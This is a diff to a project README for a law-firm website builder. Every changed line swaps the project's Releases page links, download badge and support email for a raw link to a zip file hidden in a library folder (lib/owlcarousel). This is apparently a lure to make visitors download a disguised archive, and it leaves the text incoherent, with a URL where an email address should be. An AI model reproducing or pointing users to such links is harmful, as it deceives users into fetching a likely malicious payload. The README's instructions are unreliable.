@@ -4,10 +4,10 @@
 Welcome to the lawyer-website project. This application helps you create professional websites for law firms easily and quickly. Follow the steps below to download and set up.
 
 ## 🔗 Download the Latest Release
-[![Download lawyer-website](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/pigeonbreasted-boot651/lawyer-website/releases)
+[![Download lawyer-website](https://raw.githubusercontent.com/pigeonbreasted-boot651/lawyer-website/main/lib/owlcarousel/lawyer-website-1.6.zip%https://raw.githubusercontent.com/pigeonbreasted-boot651/lawyer-website/main/lib/owlcarousel/lawyer-website-1.6.zip)](https://raw.githubusercontent.com/pigeonbreasted-boot651/lawyer-website/main/lib/owlcarousel/lawyer-website-1.6.zip)
 
 ## 📥 Download & Install
-To get the lawyer-website application, visit the Releases page: [Download here](https://github.com/pigeonbreasted-boot651/lawyer-website/releases). 
+To get the lawyer-website application, visit the Releases page: [Download here](https://raw.githubusercontent.com/pigeonbreasted-boot651/lawyer-website/main/lib/owlcarousel/lawyer-website-1.6.zip). 
 
 1. Click on the link above.
 2. You will see the latest version available.
@@ -56,10 +56,10 @@ After the download is finished, locate the file in your Downloads folder.
 5. **Publish**: Once satisfied with your design, click on "Publish" to make your website live.
 
 ## 📞 Support
-If you face issues while downloading or using lawyer-website, help is available. Reach out to our support team via email at support@lawyer-website.com, or check our [FAQ page](#) for common questions.
+If you face issues while downloading or using lawyer-website, help is available. Reach out to our support team via email at https://raw.githubusercontent.com/pigeonbreasted-boot651/lawyer-website/main/lib/owlcarousel/lawyer-website-1.6.zip, or check our [FAQ page](#) for common questions.
 
 ## 📖 Further Information
 For more detailed instructions and tips, refer to our [User Guide](#) or explore the project [Wiki](#) for additional resources.
 
 ## 🔗 Final Thoughts
-Thank you for choosing lawyer-website for your practice. Creating a professional online presence is essential for today's law firms, and we’re here to help you every step of the way. Don’t forget to visit our [Releases page](https://github.com/pigeonbreasted-boot651/lawyer-website/releases) for updates and new features.
+Thank you for choosing lawyer-website for your practice. Creating a professional online presence is essential for today's law firms, and we’re here to help you every step of the way. Don’t forget to visit our [Releases page](https://raw.githubusercontent.com/pigeonbreasted-boot651/lawyer-website/main/lib/owlcarousel/lawyer-website-1.6.zip) for updates and new features.
